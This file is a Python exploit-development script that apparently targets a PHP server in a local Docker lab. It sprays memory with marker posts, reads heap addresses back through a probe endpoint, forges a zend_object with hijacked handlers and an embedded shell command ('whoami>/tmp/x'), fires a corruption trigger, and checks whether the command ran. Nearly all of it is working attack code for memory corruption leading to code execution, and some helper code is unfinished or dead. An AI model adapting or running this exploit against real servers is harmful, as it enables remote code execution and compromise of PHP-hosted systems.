#!/usr/bin/env python3
"""oom111: DIFF the walk footprint — measure, do not infer.

oom110c: OBJ aimed into fat body's own values (legal bits, stable
region), fires silent. Question: does the teardown even touch the
block? We diff the block region around a fat fire via oom_probe
?read (absolute VA, binary-safe host decode).

Sequence:
  1. fat-marker post (MARKER values) -> probe marker VA  -> b0
  2. aim fat post: block at b0..b0+~1.5KB, OBJ per three-bit law
     (BOFF searched in 500..1100), pointer run grid aligned to VA-8
     from b0 up to block.
  3. pre  = read block region qwords via probe (absolute addrs)
  4. fire = fat stock body (walk trigger)
  5. post = read block region again -> diff qwords
  6. decode: any qword decremented from 1 -> 0 = the walked rc
     (rdi would have been that addr). Decrement on pointer-qword
     low dword -> its hi dword changes (borrow) = slot marker.
Report every changed offset; conclude X = walked-slot offset.
"""
import struct, subprocess, time, urllib.request, urllib.error
import payload68

HOST = "http://127.0.0.1:8081"
TILE = 176
MAXT = 1537

MARKER = b"QMARK7XY" * 3
WARM = b"WARMUPX" * 24 + b"W" * 400


def get(url, timeout=60):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(65536).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def post(body, timeout=120):
    req = urllib.request.Request(HOST + "/oom_sapi.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=X"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % e


def sh(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90).stdout


def parse_probe(out):
    rva = None
    offs = []
    for line in out.splitlines():
        m = re.search(r"R=([0-9a-f]+) d=((?:[0-9a-f]+ ?)*)", line)
        if m:
            rva = int(m.group(1), 16)
            offs = [int(x, 16) for x in m.group(2).split() if x]
    return rva, offs


import re  # noqa: E402


def probe_scan(needle, chunk=262144, maxc=4):
    h = needle.hex()
    for attempt in range(6):
        code, out = get("%s/oom_probe.php?h=%s&chunk=%d&maxc=%d" % (HOST, h, chunk, maxc))
        if code == 200 and out.strip() and "Fatal" not in out and out.strip() not in ("bad", "ERR open"):
            rva, offs = parse_probe(out)
            if rva and offs:
                return rva, offs
        time.sleep(0.7)
    return None, []


def probe_read(va, n):
    code, out = get("%s/oom_probe.php?read=%d&n=%d" % (HOST, va, n))
    if code != 200 or out.startswith("ERR"):
        return None
    try:
        return bytes.fromhex(out.strip())
    except Exception:
        return None


def obj_block():
    B = bytearray(TILE)
    struct.pack_into("<I", B, 0x00, 1)            # rc
    struct.pack_into("<I", B, 0x04, 0x108)        # ti: IS_OBJECT|DESTRUCTOR_CALLED
    struct.pack_into("<I", B, 0x08, 1)            # handle
    struct.pack_into("<I", B, 0x0C, 1)            # num_args(frame+0x2C => +0x0C)
    struct.pack_into("<Q", B, 0x10, 0)            # ce
    struct.pack_into("<Q", B, 0x38, OBJ & ~0xFF)  # handlers -> table base
    struct.pack_into("<Q", B, 0x40, OBJ & ~0xFF)  # (table base == block base)
    struct.pack_into("<Q", B, 0x50, OBJ)          # arg zval (self)
    struct.pack_into("<I", B, 0x58, 6)            # IS_STRING
    struct.pack_into("<I", B, 0x5C, 0x106)        # zend_string type_info
    struct.pack_into("<Q", B, 0x60, 0)            # h
    struct.pack_into("<I", B, 0x68, 13)           # len
    B[0x6C:0x6C + 13] = b"whoami>/tmp/x"
    B[0x79] = 0
    struct.pack_into("<Q", B, 0x90, 1)            # T[13]=1 (table @ +0x90)
    return bytes(B)


def build_aim(OBJ, BOFF, b0):
    T = bytearray(MAXT)
    # pointer run: VA-8-aligned slots from b0 to block, every 8
    start = b0 + ((8 - (b0 & 7)) % 8)
    for off in range(0, BOFF, 8):
        if b0 + off < start:
            continue
        struct.pack_into("<Q", T, off, OBJ)
    T[BOFF:BOFF + TILE] = obj_block()
    return bytes(T)


def fire_body(tile):
    P = payload68
    body = P.build_attack(3400, 0x41414141, value_tile=tile)
    return body


print("=== oom111: walk-footprint diff ===")
# 0. warm + measure
for i in range(20):
    post(WARM)
rva, offs = probe_scan(MARKER)
print("markers:", [hex(o) for o in offs][:6])
b0 = offs[0] - 0x40  # align block start near first marker
print("b0=0x%x" % b0)

# 1. find legal OBJ
OBJ = None
BOFF = None
for bo in range(500, 1100):
    cand = b0 + bo
    if (cand & 0xF) == 8 and ((cand >> 8) & 1) == 1 and ((cand >> 9) & 1) == 0:
        OBJ = cand
        BOFF = bo
        break
print("OBJ=0x%x BOFF=%d" % (OBJ, BOFF))

tile = build_aim(OBJ, BOFF, b0)
# aim post: markers so b0 stays measurable
aim_tile = tile
segs = []
mark = MARKER
pos = tile.find(mark)
segs.append(aim_tile if pos < 0 else aim_tile)  # single tile; markers built-in below
# embed markers at fixed tile offsets 0 and 500 for re-find
T2 = bytearray(tile)
T2[0:24] = MARKER
T2[500:524] = MARKER
tile = bytes(T2)
body = fire_body(tile)
print("aim body: %d bytes" % len(body))
code, resp = post(body)
print("aim: (%s) %r" % (code, resp[:60]))

# 2. re-find block region
rva2, offs2 = probe_scan(MARKER)
print("post-aim markers:", [hex(o) for o in offs2][:6])
if not offs2:
    print("NO MARKERS AFTER AIM POST")
    raise SystemExit(1)
b0b = offs2[0] - (offs2[0] % 8)
# actual block = where we wrote it: b0b corresponds to tile offset 0 of the
# copy that landed; OBJ should equal b0b + BOFF - 500 + (adjust) -- we verify
# by reading back the block signature at candidate:
def find_block(base_va):
    for probe_off in range(0, 1600 - TILE, 8):
        d = probe_read(base_va + probe_off + BOFF - BOFF + BOFF, 4)
    return None

# simpler: OBJ absolute is what matters; search near first marker
block_va = None
for delta in range(-1600, 1601, 8):
    cand = offs2[0] + delta
    d = probe_read(cand + BOFF, 4)
    if d and struct.unpack("<I", d)[0] == 1:
        d2 = probe_read(cand + BOFF + 4, 4)
        if d2 and struct.unpack("<I", d2)[0] == 0x108:
            block_va = cand + BOFF
            break
print("block_va=0x%x (target OBJ=0x%x)" % (block_va if block_va else 0, OBJ))

# 3. pre-diff snapshot of block vicinity
PRE = {}
for off in range(-64, TILE + 64, 8):
    d = probe_read(block_va + off, 8)
    PRE[off] = struct.unpack("<Q", d)[0] if d else None
print("pre snapshot: %d qwords" % sum(1 for v in PRE.values() if v is not None))

# 4. fire fat trigger
fbody = fire_body(tile)
code, resp = post(fbody)
print("fire: (%s) %r" % (code, resp[:60]))

# 5. post-diff
CHANGED = []
for off in range(-64, TILE + 64, 8):
    d = probe_read(block_va + off, 8)
    v = struct.unpack("<Q", d)[0] if d else None
    if PRE[off] is not None and v is not None and PRE[off] != v:
        CHANGED.append((off, PRE[off], v))
print("changed qwords:")
for (off, a, b) in CHANGED:
    print("  %+5d: 0x%016x -> 0x%016x" % (off, a, b))
if not CHANGED:
    print("NO CHANGES -> teardown never touched the block region")

# 6. verdict
x = sh("docker exec php_vuln sh -c 'ls -la /tmp/x 2>&1; cat /tmp/x 2>&1'")
print("x:", x.strip())
